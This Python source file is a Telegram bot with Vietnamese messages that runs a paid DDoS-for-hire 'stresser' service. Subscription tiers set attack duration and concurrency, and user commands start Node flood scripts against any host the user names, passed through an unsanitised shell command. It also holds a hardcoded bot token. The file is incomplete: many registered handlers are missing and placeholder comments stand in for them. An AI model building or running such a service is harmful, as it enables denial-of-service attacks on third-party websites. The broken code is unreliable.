# bot_tele.py – Toxicity Stresser Bot | VIP Pro Edition (Fixed Termux)

import json
import os
import subprocess
import time
import asyncio
import os as os_env
from datetime import datetime
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
)
from apscheduler.schedulers.background import BackgroundScheduler

# ==================== FIX TIMEZONE CHO TERMUX ====================
os_env.environ['TZ'] = 'Asia/Ho_Chi_Minh'

# ==================== CONFIG ====================
TOKEN = "8698289101:AAGRjgdUtoQZL8x8BB-_LkjQCMs4GQaLO9g"   # ← Token mới đã thay

DATA_FILE = "user_data.json"
ATTACK_LOG = "attack_history.json"

ADMINS = [6958418151]   # Thêm ID admin khác nếu cần

PLANS = {
    "free":    {"name": "FREE",    "max_time": 45,   "conc": 1,  "cooldown": 180},
    "vip":     {"name": "VIP",     "max_time": 900,  "conc": 4,  "cooldown": 90},
    "vippro":  {"name": "VIP PRO", "max_time": 3600, "conc": 8,  "cooldown": 45},
    "admin":   {"name": "ADMIN",   "max_time": 86400,"conc": 50, "cooldown": 0},
}

BOT_ENABLED = True
user_plans = {}
banned_users = []
attack_counter = 0
active_attacks = {}
completed_attacks = {}
last_attack_time = {}

# Load data
def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            d = json.load(f)
        return d.get("user_plans", {}), d.get("banned", []), d.get("attack_counter", 0)
    return {}, [], 0

def save_data():
    with open(DATA_FILE, "w") as f:
        json.dump({
            "user_plans": user_plans,
            "banned": banned_users,
            "attack_counter": attack_counter
        }, f, indent=4)

user_plans, banned_users, attack_counter = load_data()

def is_admin(uid: int) -> bool:
    return uid in ADMINS

def get_plan(uid: int):
    key = user_plans.get(str(uid), "free")
    return PLANS.get(key, PLANS["free"])

def is_banned(uid: int) -> bool:
    return str(uid) in banned_users

def can_launch_attack(uid: int):
    if is_banned(uid):
        return False, "🚫 Bạn đã bị ban!"

    plan = get_plan(uid)
    now = time.time()
    last_ts = last_attack_time.get(uid, 0)
    elapsed = now - last_ts

    if elapsed < plan["cooldown"]:
        return False, f"⏳ Còn {int(plan['cooldown'] - elapsed)} giây cooldown!"

    current = len(active_attacks.get(uid, {}))
    if current >= plan["conc"]:
        return False, f"⚠️ Đạt giới hạn {plan['conc']} attack đồng thời!"

    return True, ""

def normalize_host(host: str) -> str:
    host = host.strip()
    if not host.startswith(("http://", "https://")):
        host = "https://" + host
    return host

# ==================== ATTACK LAUNCH ====================
async def launch_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, method: str, script: str, extra: str):
    global attack_counter, last_attack_time
    user_id = update.effective_user.id

    if not BOT_ENABLED:
        return await update.message.reply_text("🚫 Bot đang tắt.")

    if len(context.args) != 2:
        return await update.message.reply_text(f"Sử dụng: /{method} <host> <time>")

    try:
        sec = int(context.args[1])
    except:
        return await update.message.reply_text("Time phải là số!")

    plan = get_plan(user_id)
    if sec > plan["max_time"]:
        return await update.message.reply_text(f"⛔ Max time: {plan['max_time']}s")

    ok, msg = can_launch_attack(user_id)
    if not ok:
        return await update.message.reply_text(msg)

    normalized = normalize_host(context.args[0])
    attack_counter += 1
    aid = attack_counter

    try:
        cmd = f"node {script} {normalized} {sec} {extra} &"
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if user_id not in active_attacks:
            active_attacks[user_id] = {}
        active_attacks[user_id][aid] = {
            "start": time.time(),
            "duration": sec,
            "host": normalized,
            "method": method.upper()
        }

        last_attack_time[user_id] = time.time()

        await update.message.reply_text(
            f"✅ **Attack #{aid} KHỞI ĐỘNG!** 🚀\n"
            f"Method: {method.upper()}\n"
            f"Target: {normalized}\n"
            f"Time: {sec}s\n"
            f"Plan: {plan['name']}"
        )

        asyncio.create_task(notify_completion(user_id, aid, sec, update.message.chat_id, context.application.bot))

    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi: {str(e)}")

async def notify_completion(user_id: int, aid: int, duration: int, chat_id: int, bot):
    await asyncio.sleep(duration + 10)
    try:
        if user_id in active_attacks and aid in active_attacks[user_id]:
            info = active_attacks[user_id].pop(aid)
            if user_id not in completed_attacks:
                completed_attacks[user_id] = []
            completed_attacks[user_id].append({
                "id": aid,
                "host": info["host"],
                "method": info["method"],
                "finished": datetime.now().strftime("%H:%M:%S")
            })
            completed_attacks[user_id] = completed_attacks[user_id][-10:]

            await bot.send_message(chat_id=chat_id, 
                                 text=f"🏁 **Attack #{aid} HOÀN TẤT!**\nTarget: {info['host']}\nMethod: {info['method']}")
    except:
        pass

# ==================== ADMIN COMMANDS ====================
async def giveplan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("Chỉ admin dùng được lệnh này!")
    # (giữ nguyên phần còn lại của hàm này và các hàm admin khác...)

    if len(context.args) != 2:
        return await update.message.reply_text("Sử dụng: /giveplan <user_id> <plan>")
    try:
        target_id = str(int(context.args[0]))
        plan_key = context.args[1].lower()
    except:
        return await update.message.reply_text("User ID phải là số!")

    if plan_key not in PLANS:
        return await update.message.reply_text("Plan không hợp lệ!")

    user_plans[target_id] = plan_key
    save_data()
    p = PLANS[plan_key]
    await update.message.reply_text(f"✅ Đã cấp **{p['name']}** cho user {target_id}")

# (Các hàm ban, unban, stopall, resetram... giữ nguyên như code cũ của bạn)

# ==================== MAIN ====================
def main():
    global application
    application = Application.builder().token(TOKEN).build()

    app = application
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("plan", plan_command))
    app.add_handler(CommandHandler("methods", methods))
    app.add_handler(CommandHandler("attacks", attacks_command))
    app.add_handler(CommandHandler("tls", tls_command))
    app.add_handler(CommandHandler("capcha", capcha_command))

    app.add_handler(CommandHandler("giveplan", giveplan_command))
    app.add_handler(CommandHandler("ban", ban_command))
    app.add_handler(CommandHandler("unban", unban_command))
    app.add_handler(CommandHandler("banned", banned_list))
    app.add_handler(CommandHandler("on", on_command))
    app.add_handler(CommandHandler("off", off_command))
    app.add_handler(CommandHandler("stopall", stopall_command))
    app.add_handler(CommandHandler("resetram", resetram_command))

    scheduler = BackgroundScheduler(timezone='Asia/Ho_Chi_Minh')
    scheduler.start()

    print("✅ Toxicity Stresser VIP Pro đang chạy với token mới...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()